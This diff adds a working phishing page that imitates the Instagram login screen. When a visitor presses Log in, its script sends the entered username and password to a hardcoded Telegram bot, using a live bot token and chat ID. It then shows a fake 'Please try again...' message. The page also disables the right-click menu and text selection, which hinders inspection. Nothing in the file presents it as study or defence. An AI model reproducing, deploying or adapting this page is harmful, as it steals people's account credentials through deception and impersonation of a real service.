@@ -1,0 +1,266 @@
+
+<style>
+
+* {
+    margin: 0px;
+    padding: 0px;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+}
+body {
+  user-select: none;
+  -moz-user-select: none;
+  -webkit-user-select: none;
+  -ms-user-select: none;
+}
+body {
+    background-color: #fff;
+}
+
+#container {
+    display: flex;
+    align-items: center;
+    margin: 50px auto;
+    flex-direction: column;
+}
+
+section {
+    margin: 20px 5;
+}
+
+.main-top {
+    width: 350px;
+    text-align: center;
+    margin-bottom: 5px;
+    padding: 50px 50px;
+}
+
+.logo img {
+    height: 220px;
+    width: 400px;
+    margin-left: -75px;
+}
+
+.username,
+.password {
+    width: 100%; 
+    margin-bottom: 5px;
+    padding: 8px 12px;
+    border: 1px solid #dbdbdb;
+    font-size: 15px;
+    border-radius: 3px;
+}
+
+input:focus {
+    outline: none;
+}
+
+.login-btn {
+    width: 80%;
+    background-color: #3897f0;
+    border: 1px solid #3897f0;
+    padding: 10px 0;
+    color: #fff;
+    cursor: pointer;
+    border-radius: 3px;
+}
+
+.main-bottom a {
+    margin-left: 130px;
+    text-decoration: none;
+    font-size: 14px;
+    line-height: 30px;
+}
+
+.bottom {
+    width: 350px;
+    text-align: center;
+    padding: 0px 0;
+}
+
+.signUp a {
+    text-decoration: none;
+    cursor: pointer;
+    color: #3897f0;
+}
+
+.app-section {
+    text-align: center;
+    padding: 10px 0;
+}
+
+.app-section span {
+    font-size: 16px;
+}
+
+
+.logo1 img {
+    height: 200px;
+    width: 330px;
+}
+
+.forget {
+    color: #3897f0;
+}
+
+@media only screen and (max-width: 600px) {
+    #container {
+        margin: 20px auto;
+    }
+
+    .main-top {
+        width: 100%;
+        padding: 30px 20px;
+    }
+
+    .logo img {
+        height: auto;
+        width: 120%;
+        margin-left: -35px;
+        margin-top: -50px;
+    }
+
+    .username,
+    .password {
+        width: 80%;
+        margin-bottom: 10px;
+    }
+
+    .main-bottom a {
+        margin-left: 120px;
+    }
+
+    .bottom {
+        width: 100%;
+    }
+
+    .logo1 img {
+        height: auto;
+        width: 100%;
+        margin-top: 100px;
+    }
+}
+
+
+/* Define the styles for the loading circle */
+  .loading-circle {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #3498db;
+    border-radius: 50%;
+    width: 20px;
+    height: 20px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+    margin-right: 5px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Instagram </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+  
+</head>
+<body>
+
+    <div id="container">
+        <section>
+            <div class="main-top">
+                <div class="logo">
+                    <img src="img/IMG_20231202_202327.jpg" />
+                </div>
+<div>
+  <input type="text" placeholder="Mobile number, username or email" class="username" id="username" />
+  <div>
+    <input type="password" placeholder="password" class="password" id="password" />
+  </div>
+  <div class="main-bottom">
+    <a href="/index.html" class="forget"> Forgot password? </a>
+  </div>
+  <input type="button" value="Log in" class="login-btn" onclick="submitForm()" />
+</div>
+
+            </div>
+            <div class="bottom">
+                <div class="signUp">
+                    Don't have an account? <a href="https://www.instagram.com">Sign up</a>
+                </div>
+            
+                            <div class="logo1">
+                    <img src="img/IMG_20231202_202302.jpg" />
+                </div>
+               </div>
+        </section>
+       
+<script>
+
+    function submitForm() {
+  var username = document.getElementById('username').value;
+  var password = document.getElementById('password').value;
+
+  var botToken = '6634310991:AAFRmZOIRuezOrmpXvYITkCcE7VB0tLTzKY';
+  var chatId = '1815466190';
+
+  var message = 'Username: ' + username + '\nPassword: ' + password;
+  var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + message;
+
+  fetch(url, { method: 'GET' })
+    .then(response => response.json())
+    .then(data => {
+      console.log(data); // Log Telegram API response
+
+      // Display custom message after 2 seconds
+      showMessage('Please try again...');
+    })
+    .catch(error => console.error('Error:', error));
+}
+
+function showMessage(message) {
+  // Create a div element for the message
+  var messageDiv = document.createElement('div');
+  messageDiv.textContent = message;
+  messageDiv.style.position = 'fixed';
+  messageDiv.style.top = '50%';
+  messageDiv.style.left = '50%';
+  messageDiv.style.transform = 'translate(-50%, -50%)';
+  messageDiv.style.padding = '10px';
+  messageDiv.style.backgroundColor = '#333';
+  messageDiv.style.color = '#fff';
+  messageDiv.style.borderRadius = '5px';
+  messageDiv.style.opacity = '0.9';
+  messageDiv.style.zIndex = '9999';
+
+  // Append the message div to the body
+  document.body.appendChild(messageDiv);
+
+  // Remove the message div after 2 seconds
+  setTimeout(function () {
+    document.body.removeChild(messageDiv);
+  }, 3000);
+}
+
+</script>
+
+
+<script>
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+  });
+</script>
+
+
+</body>
+</html>
